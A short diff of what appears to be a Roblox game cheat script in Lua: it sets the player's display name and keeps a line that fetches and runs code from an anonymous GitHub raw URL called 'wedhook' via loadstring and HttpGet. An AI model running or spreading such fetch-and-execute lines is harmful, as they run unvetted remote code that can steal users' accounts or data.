@@ -1,3 +1,10 @@
+game.Players.LocalPlayer.DisplayName =  "Asura_Kenshiro"
+
+
+
+
+
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
 
            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
